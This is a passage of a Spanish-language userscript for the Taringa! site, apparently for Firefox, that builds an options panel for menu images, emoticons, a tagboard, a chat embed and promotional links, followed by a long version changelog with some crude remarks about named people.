	nuevaHTML += '	<input type="button" value="Guardar Cambios" id="Btn_Guardar_Opciones" title="Guardar cambios en la memoria de Firefox" class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '  <div id="mensaje-opciones" class="ui-state-highlight ui-corner-all" style="display:none;padding: 0pt 0.7em; margin-top: 20px;"><p><span class="ui-icon ui-icon-info" style="float: left; margin-right: 0.3em;"></span><strong>Guardado Correcto:</strong> La nueva configuración se guardo correctamente en la memoria de Firefox. Ahora al actualizar el script la configuración no se perderá.</p></div>';
	nuevaHTML += ' </b></div>';
	nuevaHTML += ' <div id="imagenes-2"><b>';
	nuevaHTML += '	<div align="right">Taringa! <img id="previe-mt" src="'+MenuTaringa+'" width="25" height="25" align="absmiddle"/>';
	nuevaHTML += '	<input type="text" id="mt-url" src="'+MenuTaringa+'" size="50" value="'+MenuTaringa+'"/>';
	nuevaHTML += '	<input type="button" id="mt-url" onclick="$(\'#previe-mt\').attr(\'src\',$(\'#mt-url\').attr(\'value\'))" value="Previsualizar" title="" width="50" class="ui-state-default ui-corner-all"/><br/>';
	nuevaHTML += '	Mensajes - Vacio <img id="previe-mmv" src="'+MenuMensajesVacio+'" width="25" height="25" align="absmiddle"/>';
	nuevaHTML += '	<input type="text" id="mmv-url" src="'+MenuMensajesVacio+'" size="50" value="'+MenuMensajesVacio+'"/>';
	nuevaHTML += '	<input type="button" id="mmv-url" onclick="$(\'#previe-mmv\').attr(\'src\',$(\'#mmv-url\').attr(\'value\'))" value="Previsualizar" title="" width="50" class="ui-state-default ui-corner-all"/><br/>';
	nuevaHTML += '	Mensajes - Lleno <img id="previe-mml" src="'+MenuMensajesLleno+'" width="25" height="25" align="absmiddle"/>';
	nuevaHTML += '	<input type="text" id="mml-url" src="'+MenuMensajesLleno+'" size="50" value="'+MenuMensajesLleno+'"/>';
	nuevaHTML += '	<input type="button" id="mml-url" onclick="$(\'#previe-mml\').attr(\'src\',$(\'#mml-url\').attr(\'value\'))" value="Previsualizar" width="50" class="ui-state-default ui-corner-all"/><br/>';
	nuevaHTML += '	Monitor de Usuario <img id="previe-mm" src="'+MenuMonitor+'" width="25" height="25" align="absmiddle"/>';
	nuevaHTML += '	<input type="text" id="mm-url" src="'+MenuMonitor+'" size="50" value="'+MenuMonitor+'"/>';
	nuevaHTML += '	<input type="button" id="mm-url" onclick="$(\'#previe-mm\').attr(\'src\',$(\'#mm-url\').attr(\'value\'))" value="Previsualizar" width="50" class="ui-state-default ui-corner-all"/><br/>';
	nuevaHTML += '	Mis Favoritos <img id="previe-mf" src="'+MenuFavoritos+'" width="25" height="25" align="absmiddle"/>';
	nuevaHTML += '	<input type="text" id="mf-url" src="'+MenuFavoritos+'" size="50" value="'+MenuFavoritos+'"/>';
	nuevaHTML += '	<input type="button" id="mf-url" onclick="$(\'#previe-mf\').attr(\'src\',$(\'#mf-url\').attr(\'value\'))" value="Previsualizar" width="50" class="ui-state-default ui-corner-all"/><br/>';
	nuevaHTML += '	Mi Cuenta <img id="previe-mc" src="'+MenuCuenta+'" width="25" height="25" align="absmiddle"/>';
	nuevaHTML += '	<input type="text" id="mc-url" src="'+MenuCuenta+'" size="50" value="'+MenuCuenta+'"/>';
	nuevaHTML += '	<input type="button" id="mc-url" onclick="$(\'#previe-mc\').attr(\'src\',$(\'#mc-url\').attr(\'value\'))" value="Previsualizar" width="50" class="ui-state-default ui-corner-all"/><br/>';
	nuevaHTML += '	Cerrar Sesión <img id="previe-mcs" src="'+MenuCerrarSesion+'" width="25" height="25" align="absmiddle"/>';
	nuevaHTML += '	<input type="text" id="mcs-url" src="'+MenuCerrarSesion+'" size="50" value="'+MenuCerrarSesion+'"/>';
	nuevaHTML += '	<input type="button" id="mcs-url" onclick="$(\'#previe-mcs\').attr(\'src\',$(\'#mcs-url\').attr(\'value\'))" value="Previsualizar" width="50" class="ui-state-default ui-corner-all"/><br/>';
	nuevaHTML += '	Borradores <img id="previe-mb" src="'+MenuBorradores+'" width="25" height="25" align="absmiddle"/>';
	nuevaHTML += '	<input type="text" id="mb-url" src="'+MenuBorradores+'" size="50" value="'+MenuBorradores+'"/>';
	nuevaHTML += '	<input type="button" id="mb-url" onclick="$(\'#previe-mb\').attr(\'src\',$(\'#mb-url\').attr(\'value\'))" value="Previsualizar" width="50" title="Previsulizar Imagen" class="ui-state-default ui-corner-all"/><br/>';
	nuevaHTML += '	Opciones del Script <img id="previe-mo" src="'+MenuOpciones+'" width="25" height="25" align="absmiddle"/>';
	nuevaHTML += '	<input type="text" id="mo-url" src="'+MenuOpciones+'" size="50" value="'+MenuOpciones+'"/>';
	nuevaHTML += '	<input type="button" id="mo-url" onclick="$(\'#previe-mo\').attr(\'src\',$(\'#mo-url\').attr(\'value\'))" value="Previsualizar" width="50" title="Previsulizar Imagen" class="ui-state-default ui-corner-all"/><br/>';
	nuevaHTML += '	Nueva Actualización del Script <img id="previe-ma" src="'+MenuActualizacion+'" width="25" height="25" align="absmiddle"/>';
	nuevaHTML += '	<input type="text" id="ma-url" src="'+MenuActualizacion+'" size="50" value="'+MenuActualizacion+'"/>';
	nuevaHTML += '	<input type="button" id="ma-url" onclick="$(\'#previe-ma\').attr(\'src\',$(\'#ma-url\').attr(\'value\'))" value="Previsualizar" width="50" title="Previsulizar Imagen" class="ui-state-default ui-corner-all"/><br/>';
	nuevaHTML += '	Tamaño de los iconos: <label><input name="ms" value="15" type="radio" '+(MenuSize == 15? 'checked="checked"':'')+'>15x15</label><label><input name="ms" value="17" type="radio" '+(MenuSize == 17? 'checked="checked"':'')+'>17x17</label><label><input name="ms" value="19" type="radio" '+(MenuSize == 19? 'checked="checked"':'')+'>19x19</label><label><input name="ms" value="21" type="radio" '+(MenuSize == 21? 'checked="checked"':'')+'>21x21</label><label><input name="ms" value="23" type="radio" '+(MenuSize == 23? 'checked="checked"':'')+'>23x23</label><label><input id="ms" name="ms" value="25" type="radio" '+(MenuSize == 25? 'checked="checked"':'')+'>25x25</label></div><hr/>';
	nuevaHTML += '	<input type="button" value="Guardar Cambios de Imágenes" id="Btn_Guardar_Imagenes" title="Guardar cambios de imágenes en la memoria de Firefox" class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '	<input type="button" value="Restablecer Cambios" id="Btn_Restablecer_Imagenes" title="Restablecer a los imágenes originales del script" class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '	<input type="button" value="Restablecer Originales de Taringa" id="Btn_Restablecer_Imagenes_T" title="Restablecer a los imágenes originales del menú de Taringa" class="ui-state-default ui-corner-all"/><hr>';
	nuevaHTML += '	* la previsualización puede tardar un rato en cargar la imagen.';
	nuevaHTML += '    <div id="mensaje-imagenes" class="ui-state-highlight ui-corner-all" style="display:none;padding: 0pt 0.7em; margin-top: 20px;"><p><span class="ui-icon ui-icon-info" style="float: left; margin-right: 0.3em;"></span><strong>Guardado Correcto:</strong> La nueva configuración se guardo correctamente en la memoria de Firefox. Ahora al actualizar el script la configuración no se perderá.</p></div>';
	nuevaHTML += ' </b></div>';
	nuevaHTML += ' <div id="imagenes-3" align="justify">';
	nuevaHTML += '  Al agregar un emoticon se deberá ingresar la dirección URL de la imágen o emoticon y una dirección URL de una imágen o emoticon que es la que aparecerá en la parte para elegir. Hago incapié en esto porque si eligen un GIF de 5MB y lo ponen también como miniatura para el emoticon, el script lo escalará para no deformar la página pero no le bajará el peso. Por lo tanto, si eligen uno capaz no sea problema pero si ponen 5 o 10 GIF pesados con la misma URL para la imágen que para la miniatura, cada vez que cargue un post van a cargar todos los GIF pesados gastando ancho de banda inutilmente. Con esto aclarado pueden utilizarlo.<hr><b>Un truquito para los gif de tinypic es agregarle un "_th" antes del punto. Por ejemplo a <u>http://i44.tinypic.com/2e2nxjb.gif</u> que pesa 2.60MB le agregamos el "_th" antes del punto quedando <u>http://i44.tinypic.com/2e2nxjb_th.gif</u> con un peso de 0.60MB. No es huy que liviano pero son 2 megas menos y nada de edición.</b><hr>';
	nuevaHTML += '  Otra forma un poquito más larga pero más eficiente es la siguiente. Abrimos el block de notas y dejamos ahi la URL original de la imágen. Luego vamos a <b>http://www.tinypic.com</b> y seleccionamos la opción <b>URL</b> en <b>"Tipo de archivo"</b> y ponemos la URL del block de notas, seleccionamos <b>avatar(100x75)</b> en el menú de <b>"Cambiar el Tamaño"</b>. A continuación subimos la imagen y una vez terminada hacemos click en <b>"Editar"</b> que está debabajo de la previsualización de la imagen que acabamos de subir. Una vez finalizado de cargar el editor simplemente hacemos click en <b>"Save a copy"</b> y de esta manera genera una imagen sin movimiento de 5KB con su correspondiente URL. Ahora con esta URL y la que tenemos en el block de notas las usamos para agregar la imagen al administrador de emoticones y no tener pesado el post con muchos gif de 6MB al cargar.<hr>';
	nuevaHTML += '  <b>Las URL al ser guardadas se almacenan en el Firefox, dicho espacio es limitado. Pero la ventaja es que al actualizar el script estos cambios no se modifican, por lo tanto no tendrás que agregarlos una y otra vez.<hr>';
	nuevaHTML += '	<input type="button" value="Agregar Emoticon Personalizado" id="Btn_Agregar_Emoticones" title="Guardar cambios de imágenes en la memoria de Firefox" class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '	<input type="button" value="Guardar los Cambios de la Lista de Emoticones" id="Btn_Guardar_Emoticones" title="Guardar emoticones en la memoria de Firefox" class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '	<input type="button" value="Reestablecer Emoticones Originales" id="Btn_Reestablecer_Emoticones" title="Guardar emoticones en la memoria de Firefox" class="ui-state-default ui-corner-all"/><hr>';
	nuevaHTML += '	<input type="button" value="Exportar Emoticones" id="Btn_Exportar_Emoticones" title="Permite copiar los emoticones de una computadora a otra" class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '	<input type="button" value="Reemplazar Emoticones" id="Btn_Importar_Emoticones" title="Permite obtener los emoticones de otra computadora" class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '	<input type="button" value="Importar Pack de Emoticones" id="Btn_Importar_Pack_Emoticones" title="Permite agregar un pack de emoticones a los preexistentes." class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '	<input type="button" value="Crear Pack de Emoticones" id="Btn_Crear_Pack_Emoticones" title="Permite crear un pack de emoticones." class="ui-state-default ui-corner-all"/><hr>';
	nuevaHTML += '  <div id="emoticones_personalizados">'+Cargar_Emoticones()+'</div>';
	nuevaHTML += ' </b></div>';
	nuevaHTML += ' </div>';
	nuevaHTML += '</div>';
	nuevaHTML += '<div id="opciones-2" align="center">';
	nuevaHTML += '	<div id="tagboard">Deja tu opinión aquí, ya que no voy a crear nuevos post debido a que me lo cierran por pavadas:';
	nuevaHTML += '	<form name="Form_miarrobatag207890" action="http://tagboard.miarroba.com/insertarmensaje.php" method="post" target="miarrobatag207890" onsubmit="return JS_miarrobatag207890(this);" accept-charset="iso-8859-1">';
	nuevaHTML += '		<input type="hidden" name="id" value="207890"><input type="hidden" name="miarrobatag207890_msg_tmp" value="">';
	nuevaHTML += '		<input type="hidden" name="miarrobatag207890_nick_tmp" value=""><input type="hidden" name="miarrobatag207890_url_tmp" value="">';
	nuevaHTML += '		<iframe id="miarrobatag207890" name="miarrobatag207890" width="100%" height="450" src="" frameborder="0" vspace="0" hspace="0"></iframe>';
	nuevaHTML += '		<input type="hidden" id="miarrobatag207890_nick" name="miarrobatag207890_nick" value="" maxlength="20" class="ui-state-default ui-corner-all" style="width:140px;">';
	nuevaHTML += '		<br><input type="text" id="tb_msg" name="miarrobatag207890_msg" title="Escribe aquí el mensaje que aparecerá en el Tagboard" value="Tu mensaje aquí" maxlength="250" class="ui-state-default ui-corner-all" style="width:870px;">';
	nuevaHTML += '		<input type="button" name="miarrobatag207890_ayuda" value="?" title="Obtener ayuda sobre bbcodes y emoticones para agregar al mensaje" style="width:30px;" class="ui-state-default ui-corner-all" onclick="$(\'#miarrobatag207890\').attr(\'src\',\'http://tagboard.miarroba.com/ayuda.php?id=207890\');">';
	nuevaHTML += '		<br><input type="submit" id="miarrobatag207890_submit" title="Enviar mensaje al Tagboard" name="miarrobatag207890_submit" value="Envíar Mensaje" class="ui-state-default ui-corner-all" style="width:910px;">';
	nuevaHTML += '	</form></div>';
	nuevaHTML += '</div>';
	nuevaHTML += '<div id="opciones-3" align="center">';
	nuevaHTML += '    <embed id="chat" src="http://www.everywherechat.com/everywherechat.swf?defaultRoom=sharkale_radio&fontSize=12&roomList=false&theme=night" quality="best" wmode="opaque" quality="high" bgcolor="#525252" name="everywherechat" allowscriptaccess="sameDomain" pluginspage="http://www.adobe.com/go/getflashplayer" type="application/x-shockwave-flash" width="840" height="480" align="middle"></embed><br/><br/>';
	nuevaHTML += '	  <input type="button" value="Abrir chat en otra pestaña" id="Btn_Chat" title="Abrir el chat en otra pestaña" class="ui-state-default ui-corner-all"/>';
	nuevaHTML += '</div>';
	nuevaHTML += '<div id="opciones-4"><b>';
	nuevaHTML += '    <hr>Juega al mejor juego de Guerra Medieval Online junto a miles de jugadores.';
	nuevaHTML += '    <a href="http://www.guerrastribales.es/585151-es4.html" target="_blank"><img src="http://i51.tinypic.com/2d781w0.gif" alt="Unite al Mundo 4 de este espectacular juego online"/></a>';
	nuevaHTML += '    <hr>..::Descargas Sweetdani::.. - Peliculas, Juegos, Series y Música.<br/>';
	nuevaHTML += '    <a href="http://www.taringa.net/posts/links/3626450/" target="_blank"><img src="http://radio.proyectod.com.ar/descargas/catalogo.php" alt="Descargas Sweetdani" width="740"/></a><hr>';
	nuevaHTML += '    ..::Radio Sharkale®::.. - Proyecto personal de radio propia. =P<br/>';
	nuevaHTML += '    <a href="http://www.sharkale.com.ar/" target="_blank"><img src="http://i53.tinypic.com/2you5gi.png" alt="..::Radio Sharkale®::.." width="740"/></a>';
	nuevaHTML += '    <hr>Para que el script te funcione correctamente te recomiendo instalar los siguientes add-on para tu firefox.<hr>';
	nuevaHTML += '    ¿Alguna vez te han molestado todos esos anuncios e imágenes en internet que, normalmente, hacen que tarde en cargar más el resto de la página? InstalaAdblock Plus ahora y olvídate de ello.<br/>';
	nuevaHTML += '    <a href="https://addons.mozilla.org/es-ES/firefox/addon/1865" title="Añadir Adblock Plus a Firefox" target="_blank"><img src="http://i52.tinypic.com/2jdrk0z.png" align="absmiddle" /><img src="http://i52.tinypic.com/34qvapw.png" align="absmiddle" height="150"/></a><hr>';
	nuevaHTML += '    Web of Trust le mantiene seguro mientras navega y compra en Internet. Los símbolos con código de color de WOT le ayudan a evitar timos en línea, robo de identidad, sitios de compra no fiables y amenazas de seguridad antes de que haga clic. Navegue más seguro y añada WOT a Firefox ahora mismo.<br>';
	nuevaHTML += '    <a href="https://addons.mozilla.org/es-ES/firefox/addon/3456" title="Añadir WOT a Firefox" target="_blank"><img src="http://i52.tinypic.com/2jdrk0z.png" align="absmiddle" /><img src="http://i53.tinypic.com/11uw22a.png" align="absmiddle" /><img src="http://i56.tinypic.com/oqeykh.png" align="absmiddle" /><img src="http://i51.tinypic.com/14czo05.png" align="absmiddle" /></a>';
	nuevaHTML += '</b></div>';
	nuevaHTML += '<div id="opciones-5" align="justify"><b>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 30.2:</span></u></b><br>* [Fixed] Volvió TiniPic.<br>* [Fixed] Pack de emoticones de taringa.<br>* [Fixed] Varios bugs que se fueron presentando con el tiempo.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 30.1:</span></u></b><br>* [Fixed] Imágenes de IMGur.<br>* [Fixed] Host de imágenes para crear post.<br>* [Fixed] Pack de emoticones.<br>* [Fixed] Imágenes hosteadas en server propio.<br>* [Fixed] Algunos host en el linkchecker.<br><b><u><span style="color: red;">Changelog versión 30.0:</span></u></b><br>* [Fixed] Varios errores.<br>* [Fixed] Imágenes del menú.<br>* [Add] Borradores en el Menú.<br>* [Add] Nuevo servidor para subir imagenes en crear post.<br>* [Fixed] Creador de reproductor de MixPod.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 29.0:</span></u></b><br>* [Fixed] Lag al escribir en Agregar Post, causado por el contador de caracteres.<br>* [Fixed] Arreglado que al filtrar no filtraba los ultimos comentarios.<br>* [Fixed] Ultimos iconos para editar post en el perfil.<br>* [Rem] El menu contextual de "Mi cuenta" aunque todaiva peuden camiar el avatar por uno con direccion http y modificar las fotos de uno poniendo mas de 9 .<br>* [Fixed] Solapa Clima. Ahora utiliza la ubicacion guardada en "Mi Cuenta".<br>* [Fixed] Avatares al actualizar comentarios.<br>* [Fixed] Ir al Cielo y a la Tierra en cada comentario.<br>* [Fixed] Agregado "Administrar Usuario" al menu contextual del avatar para Mods y Admins de Comunidades.<br>* [Fixed] Barra de BBC y Colores adaptado al nuevo de activarse la barra de Taringa.<br>* [Add] Númeracion en comentarios y respuestas.<br>* [Add] Multi alerta de errores al crear posts o temas.<br>* [Add] Ensanchados los comentarios y agrandados un poco los avatares.<br>* [Add] Previsualización automática de la Letrota.<br>* [Fixed] No recargar la página al guardar cambio del Theme.<br>* [Add] Color del borde del comentario del creador del tema o post acorde al theme.<br>* [Add] Sus posts y Sus comentarios al menú contextual del avatar.<br>* [Add] Solapa clima en comunidades.<br>* [Add] Cambio dinámico del submenú al pasar sobre el menú "Posts" ó "Comunidades".<br>* [Fixed] Compatibilidad con formato de Poringa! (Gracias sweetdani por avisar xD)<br>* [Fixed] Aspecto del Previsualizador.<br>* [Fixed] Ocultar previsualización al comentar.<br>* [Add] Compartir la lista de emoticones con quien desees pasando solo 5 caracteres.<br>* [Add] Sus temas al menú contextual del avatar.<br>* [Add] Sombra de color para tus comentarios, respuestas y quotes.<br>* [Add] Visualización de multiples quotes en comunidades.<br>* [Add] Archivos SWF ocultos por defecto.<br>* [Add] Página para crear packs de emoticones y/o swf.<br>* [Add] Agregar packs de emoticones y/o swf a la lista actual.<br>* [Add] Botón de 99polls.<br>* [Fixed] Capturador de codigo de GoEar.<br>* [Add] Links al agregar videos de YouTube, swf, etc.<br>* [Fixed] Depuración de gran cantidad de código Ahora es mas liviano y las librerias se cargan 1 sola vez externamente al instalarlo.<br>* [Add] Block de notas autoguardable y accesible en todo momento.<br>* [Fixed] Limitado a 5 los quotes en comunidades.<br>* [Fixed] Mejorado el spoiler de archivos flash.<br>* [Fixed] Mejoradas las opciones avanzadas.<br>* [Add] Solapa chat.<br>* [Fixed] Block de Notas.<br>* [Add] Botón de MixPod.<br>* [Fixed] Página del Script.<br>* [Fixed] Barra de BBCodes.<br>* [Fixed] Crear Packs, Exportar Emoticones.<br>* [Add] Solapa Script con Submenú animado.<br>* [Add] Ocultar Comenarios.<br>* [Add] Más Opciones Configurables.<br>* [Fixed] Depuración de código.<br>* [Fixed] Categorias.<br>* [Fixed] Filtrado de Categorias.<br>* [Fixed] Depuración de código.<br>* [Fixed] Mejoradas varias funciones.<br>* [Fixed] Script mucho más liviano.<br>* [Fixed] Iniciar Sesión en plugin de TinyPic®.<br>* [Fixed] Esteticas menores.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 28.4:</span></u></b><br>* [Add] Crear imágenes para comentar con texto gigante.<br>* [Add] Avatares largos en posts.<br>* [Add] Botón de "Editar Tema" o "Editar Post" en el nuevo buscador.<br>* [Add] Link "Última Página" en cada resultado del nuevo buscador.<br>* [Add] Link "Mis Temas" en el menú contextual.<br>* [Add] Tops de las categorias filtradas en el principal.<br>* [Add] Posibilidad de guardar tu ciudad para acceso directo a tu clima.<br>* [Fixed] Pestaña del clima.<br>* [Fixed] Actualizador de comentarios de los post.<br>* [Fixed] Buscador superior.<br>* [Fixed] Bordes transparentes compatibles con cambio de color de fondo.<br>* [Fixed] Botón "Siguiente" de los post NFU en últimos post.<br>* [Fixed] Mejorado el actualizador de comentarios, y algún que otro bugs que pase por alto. (Reconoce la pagina en la que uno esta y el ultimo comentario. Solucionando la aparecion de comentarios repetidos al comentar)<br>* [Fixed] Al usar Actualizar con el boton de la imagen de actualizar ahora se actualiza esa misma página y no va a la ultima.<br>* [Fixed] Posibilidad de click derecho y "Abrir en una nueva pestaña" las paginas de comentarios. (Imposible con CTRL)<br>* [Fixed] Mis post. Para los que tienen a los novatos desactivados.<br>* [Fixed] Perfil. Para los qeu tienen novatos desactivos.<br>* [Fixed] Botones de la barra de páginas de "Mis Comunidades".<br>* [Fixed] Ejecucion del script en temas que poseian videos de YouTube y no usaban el Themer.<br>* [Fixed] Filtrado de comunidades de Poringa!.<br>* [Rem] Filtrado de Novatos. (No existe)<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 28.1:</span></u></b><br>* [Add] Mejor diseño del buscador de usuarios.<br>* [Fixed] Botón de mostrar emoticones no aparecia en temas.<br>* [Fixed] Botones del "Acerca de..." en las opciones.<br>* [Fixed] Arreglos pequeños.<br><b><u><span style="color: red;">Changelog versión 28.0:</span></u></b><br>* [Add] Buscador de usuarios en comunidades.<br>* [Add] Actualizador dinámico de páginas de comentarios y respuestas.<br>* [Add] Votar temas desde Agregar Respuesta.<br>* [Add] Compatibilidad con logo aleatorio de Taringa.<br>* [Add] Filtro dinámico de categorías.<br>* [Fixed] Ir al Medio.<br>* [Fixed] Ir a la última página en temas viejos.<br>* [Fixed] Alerta de nuevos comentarios en post propios.<br>* [Fixed] Fullscreen en videos de YouTube con color de borde acorde al tema.<br>* [Fixed] Crear comunidades.<br>* [Fixed] Cargador de TinyPic.<br>* [Fixed] Previsualizar temas.<br>* [Fixed] Alineación de los nicks en respuestas de los temas.<br>* [Fixed] Cambiador dinámico de páginas de últimos posts.<br>* [Fixed] Buscador de actualizaciones.<br>* [Fixed] Acentos en paises en perfil.<br>* [Fixed] Buscador de Google.<br>* [Fixed] Algunos host del linkchecker.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 27.5:</span></u></b><br>* [Add] Ver estado Online y Offline de los usuarios. [BETA]<br>* [Add] Guardar temas de las comunidades en favoritos.<br>* [Add] Videos en pantalla completa.<br>* [Add] Ahora el linkchecker se puede desactivar y por medio de un link ejecutarse cuando se lo desea.<br>* [Add] Preguntar si realmente desea agregar BBC a todas las URL escritas.<br>* [Add] Botón de restablecer imágenes originales del menú de taringa en las opciones avanzadas.<br>* [Add] Buscador de Google en el menú desplegable.<br>* [Fixed] Mostrar/Ocultar Emoticones en algunas páginas.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 27.1:</span></u></b><br>* [Add] Ir a la última página de comentarios en los temas de las comunidades.<br>* [Add] Actualizar comentarios en comunidades.<br>* [Add] Tags checkers en editar temas para evitarse disgustos.<br>* [Add] Nueva interfaz de la barra general.<br>* [Fixed] Boton de comunidades para algunos.<br>* [Fixed] Plugin de TinyPic mejorado.<br>* [Fixed] Previsualización de comentarios en comunidades.<br>* [Rem] Align y Size en comentarios de las comunidades.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 27.0:</span></u></b><br>* [Add] Compatibilidad total con poringa.<br>* [Add] Taringa y Poringa contienen posibilidad de tener themes diferentes.<br>* [Add] Cargador de TinyPic en "Agregar Post".<br>* [Add] Opciones directas para administrar usuarios de comunidades en temas y comentarios.<br>* [Add] Auto-Backup del post al ser creado.<br>* [Add] Archivo de posts que uno desee.<br>* [Add] BBCode en editar temas.<br>* [Fixed] Quotear imágenes en comunidades.<br>* [Fixed] Estilo descuajeringado del administrador de usuarios de Taringa.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 26.4:</span></u></b><br>* [Add] BBCodes personalizados en Agregar Post.<br>* [Fixed] Actualizador de comentarios.<br><b><u><span style="color: red;">Changelog versión 26.3:</span></u></b><br>* [Add] Botonera de "Ir al Cielo", "Ir al Medio" o "Ir a la Tierra" en comentarios.<br>* [Add] Boton de actualizar comentarios en barra de BBCode.<br>* [Add] Ocultar emoticones en "Agregar Post".<br>* [Rem] Orientacion de texto en agregar comentario.<br>* [Fixed] Comentar dos veces.<br>* [Fixed] Al guardar opciones se abria el cambiador de theme.<br>* [Fixed] Botones en "Cambiador de Theme" para usuarios con monitor WIDE.<br>* [Fixed] Al actualizar comentarios va directo a la última página dinámicamente.<br>* [Fixed] Mejoras visuales variadas.<br>* [Fixed] Optimización de código (Búsqueda y desecho de código desactualizado).<br>* [Fixed] Actualizador de script mejorado.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 26.2:</span></u></b><br>* [Add] Actualizador de comentarios.<br>* [Fixed] Editar y Borrar post en Perfil y Buscador.<br><b><u><span style="color: red;">Changelog versión 26.1:</span></u></b><br>* [Add] Link de Bloqueados en el Menú.<br>* [Add] Comunidades ordenadas en el Perfil.<br>* [Add] Contador de caracteres en Agregar Post.<br>* [Rem] Tamaño y tipo de letra en comentarios.<br>* [Fixed] Problema al citar.<br>* [Fixed] Links en comentarios del monitor.<br>* [Fixed] Previsualización del MP.<br>* [Fixed] BBCode de YouTube.<br>* [Fixed] Icono de Sticky en sección Novatos.<br>* [Fixed] Perdida del foco del cursor al usar BBC sin tener nada escrito.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 26.0:</span></u></b><br>* [Fixed] BBCode y comentarios en los Post.<br>* [Fixed] Perfil.<br>* [Fixed] Mis Post.<br>* [Fixed] Arreglos varios.<br>* [Fixed] Optimización de código.<br>* [Fixed] Administrador de Post.<br>* [Rem] Sacado el "Soyez le premier". <br>* [Fixed] Previzualizador de comentarios.<br>* [Fixed] Puntos, Denunciar y Favoritos en comentarios.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 25.0:</span></u></b><br>* Compatiblidad nuevo perfil.<br>* Arreglado administrador de post que se abria más de una vez al actualizar.<br>* Opciones de editar, borrar y administrar tus post desde el buscador.<br>* Opción de bloquear usuario directamente desde los MP.<br>* Habilitado buscador de google.<br>* Nuevo método de búsqueda de actualización menos persistente y nueva interfaz gráfica.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 24.6:</span></u></b><br>* Arreglado perfil y Puntos en Negrita.<br>* Arreglado el actualizador de comentarios.<br><b><u><span style="color: red;">Changelog versión 24.5:</span></u></b><br>* BBCode en comunidades.<br>* Preview en Comunidades.<br>* [Fixed] Bugs BBCode en comunidades.<br>* Avatares en comunidades modificados.<br>* Nueva código para previsualizar más eficáz.<br>* Tops desactivados. (Taringa! desactivó la api para los tops. Parece que manolo y su ram de mierda de 64MB no la soporta)<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 24.0:</span></u></b><br>* Nuevo logo de Taringa.<br>* Actualización general del cambiador de theme a jQuery. (Chupala Gonx lame chota!!!)<br><b><u><span style="color: red;">Changelog versión 23.6:</span></u></b><br>* Nuevas Opciones en el Cambiador de Theme.<br><b><u><span style="color: red;">Changelog versión 23.5:</span></u></b><br>* Arreglos Varios.<br><b><u><span style="color: red;">Changelog versión 23.4:</span></u></b><br>* Color de Fondo Configurable.<br><b><u><span style="color: red;">Changelog versión 23.3:</span></u></b><br>* Actualizador de Comentarios (incluido para post privados).<br><b><u><span style="color: red;">Changelog versión 23.2:</span></u></b><br>* Bugs, Bugs, Bugs y más Bugs.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 23.0:</span></u></b><br>* Compatibilidad con Faceboringa.<br>* Barra de comentarios en las comunidades.<br>* Agregados Ir al Cielo y la Tierra que no están. <br>* Buscador de Taringa! predeterminado en el buscador.<br>* Redimensionados los comentarios en el las comunidades.<br>* Redimensionado el Monitor.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 22.6:</span></u></b><br>* [Fixed] Bug de novatos en sus propios post.<br>* [Fixed] Bug de texto no se pueden votar por solidarios al quedarse sin puntos.<br>* Doble hospedaje de script por si se cae alguno. <a href="http://radio.sharkale.com.ar" target="_blank">http://radio.sharkale.com.ar</a> | <a href="http://radio.proyectod.com.ar" target="_blank">http://radio.proyectod.com.ar</a><br>* [Fixed] Problema de ancho de barra principal en Poringa!.<br>* Optmizada la barra de colores en código.<br>* [Fixed a Taringa] [br] en comentarios.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 22.5:</span></u></b><br>* Nueva barra de taringa con menús desplegables.<br>* Optimizado código de cambiador de theme.<br>* Nuevo servidor de hospedaje del script. <a href="http://radio.sharkale.com.ar" target="_blank">http://radio.sharkale.com.ar</a><br>* Compatibilidad con script de lea87crzz.<br>* [Fixed] En Link Checker al agregar prefijos a los links.<br>';
	nuevaHTML += '    <b><u><span style="color: red;">Changelog versión 22.0:</span></u></b><br>* Sección de tops totalmente realizada por mi.<br>* Previzualización de MP<br>* Acentos en Tagboard<br>* [Fixed] Quote, Fecha y Alertas de Error en Actualizador de Comentarios<br>* Imágenes de los botones de opciones en el Menú<br>* Cambiar Tamaño de las Imágenes del Menú<br>* Cambiar Theme de Taringa!<br>* [Fixed] En Link Checker<br>* Botón de Postear sin Previsualizar.<br>* Botón de actualizar todos o últimos comentarios.<br>* [Fixed] Actualizadores de últimos post en principal.<br>* [Fixed] Estilos de bordes en la página principal.<br>* Nuevo estilo de quotes.<br>* Optimización del código antigüo a una nueva versión. (40% hecho)<br>* Pie de página limpia.<br>* [Fixed] Alertas de errores en envio y actualización de comentarios.<br>* Botones de Taringa a la par con el Theme elegido.<br>* [Fixed] Agregar BBCode a todas las URL escritas.<br>';
